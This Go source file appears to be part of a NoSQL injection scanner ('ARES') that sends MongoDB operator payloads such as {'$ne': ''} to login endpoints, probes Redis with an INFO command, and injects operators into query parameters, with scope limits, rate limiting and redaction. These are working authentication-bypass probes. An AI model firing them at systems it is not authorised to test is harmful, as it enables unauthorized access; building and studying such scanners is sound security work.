package nosqli

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type Finding struct {
	URL       string    `json:"url"`
	Type      string    `json:"type"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Severity  string    `json:"severity"`
	Confirmed bool      `json:"confirmed"`
	Timestamp time.Time `json:"timestamp"`
}

type Engine struct {
	client      *http.Client
	scopeRegex  *regexp.Regexp
	allowedOps  map[string]bool
	rateLimiter chan struct{}
}

func NewEngine() *Engine {
	return &Engine{
		client: &http.Client{Timeout: 15 * time.Second},
		allowedOps: map[string]bool{
			"$ne":     true,
			"$gt":     true,
			"$lt":     true,
			"$gte":    true,
			"$lte":    true,
			"$in":     true,
			"$nin":    true,
			"$eq":     true,
			"$exists": true,
			"$type":   true,
		},
		rateLimiter: make(chan struct{}, 10),
	}
}

func (e *Engine) SetScope(pattern string) error {
	if pattern == "" {
		e.scopeRegex = nil
		return nil
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		return fmt.Errorf("invalid scope pattern: %w", err)
	}
	e.scopeRegex = re
	return nil
}

func (e *Engine) inScope(target string) bool {
	if e.scopeRegex == nil {
		return true
	}
	return e.scopeRegex.MatchString(target)
}

func (e *Engine) TestAll(target string) ([]Finding, error) {
	var findings []Finding

	if !e.inScope(target) {
		return findings, fmt.Errorf("target %s is out of scope", target)
	}

	mongoFindings, _ := e.TestMongoDB(target)
	findings = append(findings, mongoFindings...)

	redisFindings, _ := e.TestRedis(target)
	findings = append(findings, redisFindings...)

	return findings, nil
}

func (e *Engine) TestMongoDB(target string) ([]Finding, error) {
	var findings []Finding

	if !e.inScope(target) {
		return findings, fmt.Errorf("target %s is out of scope", target)
	}

	mongoPayloads := []struct {
		name    string
		payload map[string]interface{}
		check   func(string) bool
	}{
		{
			name: "$ne injection",
			payload: map[string]interface{}{
				"username": map[string]interface{}{
					"$ne": "",
				},
				"password": map[string]interface{}{
					"$ne": "",
				},
			},
			check: func(body string) bool {
				return strings.Contains(strings.ToLower(body), "welcome") ||
					strings.Contains(strings.ToLower(body), "login") ||
					strings.Contains(strings.ToLower(body), "dashboard")
			},
		},
		{
			name: "$gt injection",
			payload: map[string]interface{}{
				"username": map[string]interface{}{
					"$gt": "",
				},
			},
			check: func(body string) bool {
				return !strings.Contains(body, "invalid") && !strings.Contains(body, "error")
			},
		},
		{
			name: "$in injection",
			payload: map[string]interface{}{
				"username": map[string]interface{}{
					"$in": []interface{}{nil, ""},
				},
			},
			check: func(body string) bool {
				return strings.Contains(body, "error") || strings.Contains(body, "exception")
			},
		},
	}

	for _, p := range mongoPayloads {
		f, err := e.testMongoPayload(target, p.name, p.payload, p.check)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) testMongoPayload(target, name string, payload map[string]interface{}, check func(string) bool) (*Finding, error) {
	if !e.validatePayload(payload) {
		return nil, fmt.Errorf("payload contains disallowed operators")
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	select {
	case e.rateLimiter <- struct{}{}:
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("rate limit exceeded")
	}
	defer func() { <-e.rateLimiter }()

	start := time.Now()
	req, err := http.NewRequest("POST", target, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ARES-NoSQLi/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	duration := time.Since(start)

	if strings.Contains(name, "sleep") && duration > 4*time.Second {
		return &Finding{
			URL:       target,
			Type:      "nosqli_mongodb_time_based",
			Payload:   redactPayload(string(body)),
			Evidence:  fmt.Sprintf("Time-based injection confirmed: %v response time", duration),
			Severity:  "critical",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	if check(string(respBody)) {
		return &Finding{
			URL:       target,
			Type:      "nosqli_mongodb",
			Payload:   redactPayload(string(body)),
			Evidence:  string(respBody)[:minInt(len(respBody), 500)],
			Severity:  "high",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no MongoDB injection detected")
}

func (e *Engine) validateValue(v interface{}) bool {
	switch val := v.(type) {
	case map[string]interface{}:
		return e.validateMap(val)
	case []interface{}:
		for _, item := range val {
			if !e.validateValue(item) {
				return false
			}
		}
	}
	return true
}

func (e *Engine) validateMap(m map[string]interface{}) bool {
	for k, v := range m {
		if strings.HasPrefix(k, "$") && !e.allowedOps[k] {
			return false
		}
		if !e.validateValue(v) {
			return false
		}
	}
	return true
}

func (e *Engine) validatePayload(payload map[string]interface{}) bool {
	return e.validateMap(payload)
}

func (e *Engine) TestRedis(target string) ([]Finding, error) {
	var findings []Finding

	if !e.inScope(target) {
		return findings, fmt.Errorf("target %s is out of scope", target)
	}

	redisPayloads := []struct {
		name    string
		payload map[string]interface{}
	}{
		{
			name: "INFO command detection",
			payload: map[string]interface{}{
				"command": "INFO",
				"args":    []string{"server"},
			},
		},
	}

	for _, p := range redisPayloads {
		f, err := e.testRedisPayload(target, p.name, p.payload)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) testRedisPayload(target, name string, payload map[string]interface{}) (*Finding, error) {
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	select {
	case e.rateLimiter <- struct{}{}:
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("rate limit exceeded")
	}
	defer func() { <-e.rateLimiter }()

	req, err := http.NewRequest("POST", target, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ARES-NoSQLi/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	bodyStr := string(respBody)

	if strings.Contains(strings.ToLower(bodyStr), "redis") ||
		strings.Contains(strings.ToLower(bodyStr), "redis_version") ||
		strings.Contains(strings.ToLower(bodyStr), "tcp_port") {
		return &Finding{
			URL:       target,
			Type:      "nosqli_redis",
			Payload:   redactPayload(string(body)),
			Evidence:  bodyStr[:minInt(len(bodyStr), 500)],
			Severity:  "critical",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no Redis injection detected")
}

func (e *Engine) TestQueryParam(target, paramName string) ([]Finding, error) {
	var findings []Finding

	if !e.inScope(target) {
		return findings, fmt.Errorf("target %s is out of scope", target)
	}

	payloads := []string{
		fmt.Sprintf(`{"$ne": ""}`),
		fmt.Sprintf(`{"$gt": ""}`),
	}

	for _, p := range payloads {
		encoded := url.QueryEscape(p)
		testURL := fmt.Sprintf("%s?%s=%s", target, paramName, encoded)

		start := time.Now()
		resp, err := e.client.Get(testURL)
		if err != nil {
			continue
		}

		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		duration := time.Since(start)

		if duration > 4*time.Second {
			findings = append(findings, Finding{
				URL:       testURL,
				Type:      "nosqli_time_based",
				Payload:   redactPayload(p),
				Evidence:  fmt.Sprintf("Time-based: %v", duration),
				Severity:  "critical",
				Confirmed: true,
				Timestamp: time.Now(),
			})
			break
		}

		bodyStr := strings.ToLower(string(respBody))
		if strings.Contains(bodyStr, "error") && strings.Contains(bodyStr, "mongodb") {
			findings = append(findings, Finding{
				URL:       testURL,
				Type:      "nosqli_query_param",
				Payload:   redactPayload(p),
				Evidence:  string(respBody)[:minInt(len(respBody), 500)],
				Severity:  "high",
				Confirmed: true,
				Timestamp: time.Now(),
			})
			break
		}
	}

	return findings, nil
}

func redactPayload(payload string) string {
	redacted := payload
	for _, op := range []string{"$where", "$regex", "$eval", "$function"} {
		if strings.Contains(redacted, op) {
			redacted = "[REDACTED: destructive operator]"
			break
		}
	}
	return redacted
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
